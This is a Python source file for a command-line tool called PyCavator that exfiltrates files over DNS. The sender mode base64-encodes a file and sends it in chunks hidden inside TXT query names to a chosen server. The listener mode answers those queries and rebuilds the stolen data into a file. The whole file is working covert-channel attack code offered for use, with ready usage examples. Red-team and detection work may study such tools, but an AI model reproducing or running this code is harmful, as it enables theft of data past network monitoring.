import argparse
import socket
import base64
import os
import time
import dns.query
import dns.message
import dns.resolver

def send_data(filename, server, port, domain, interval):
    with open(filename, 'rb') as f:
        data = f.read()
        encoded_data = base64.b64encode(data).decode('utf-8')
        chunk_size = 50

        i = 0
        while i < len(encoded_data):
            chunk = encoded_data[i:i + chunk_size]
            query_name = f"{i}-{chunk}.{domain}"
            dns_query = dns.message.make_query(query_name, dns.rdatatype.TXT)

            response = dns.query.udp(dns_query, server, port)
            if response.rcode() == dns.rcode.NOERROR:
                print(f"Sent chunk: #{i}")
                i += chunk_size
            else:
                print(f"Error sending chunk #{i}. Retrying...")

            time.sleep(interval)

def listen_and_save_data(server, port, output_dir):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((server, port))
    print(f"Listener started on {server}:{port} and waiting DNS queries...")

    received_data = {}
    expected_chunk_num = 0
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            query = dns.message.from_wire(data)
            if query.question[0].rdtype == dns.rdatatype.TXT:
                query_name = query.question[0].name.to_text()[:-1]
                header, encoded_chunk = query_name.split('.', 1)[0].split('-', 1)
                chunk_num = int(header)

                if chunk_num == expected_chunk_num:
                    received_data[chunk_num] = encoded_chunk
                    print(f"Received chunk: #{chunk_num}")
                    expected_chunk_num += len(encoded_chunk)

            response = dns.message.make_response(query)
            response.flags |= dns.flags.AA
            sock.sendto(response.to_wire(), addr)

    except KeyboardInterrupt:
        print("Saving received data...")
        decoded_data = base64.b64decode(''.join(received_data.values()))

        output_file = os.path.join(output_dir, 'exfiltrated_data.bin')
        with open(output_file, 'wb') as f:
            f.write(decoded_data)
        print(f"Data saved to {output_file}")

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='PyCavator - DNS Exfiltration Tool',
        epilog='''Examples:
  # Sender mode: exfiltrate data from a file
  python pycavator-dns.py -f input.txt -s 192.168.1.101 -p 53 -d example.com -i 1 
  
  # Listener mode: listen for incoming data and save to a single file
  python pycavator-dns.py -l -s 192.168.1.101 -p 53 -o /tmp
  
  # Note: Once file has been sent, use CTRL+C in listener mode to exit and save.
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    ) 
    parser.add_argument("-f", "--file", help="File to exfiltrate")
    parser.add_argument("-s", "--server", help="DNS server IP address")
    parser.add_argument("-p", "--port", type=int, default=53, help="DNS server port (default: 53)")
    parser.add_argument("-d", "--domain", help="Domain to use for DNS queries", default="example.com")
    parser.add_argument("-i", "--interval", type=float, default=1, help="Interval between DNS queries (default: 1s)")
    parser.add_argument("-l", "--listen", action="store_true", help="Start listener")
    parser.add_argument("-o", "--output", help="Output directory for received data")

    args = parser.parse_args()

    if args.listen:
        if not args.output or not args.server or not args.port:
            parser.error("Output directory, DNS server and port are required when using -l/--listen")
        listen_and_save_data(args.server, args.port, args.output)
    else:
        if not args.file or not args.server or not args.port or not args.domain:
            parser.error("File, DNS server, port and domain are required when not using -l/--listen")
        send_data(args.file, args.server, args.port, args.domain, args.interval)

if __name__ == "__main__":
    main()
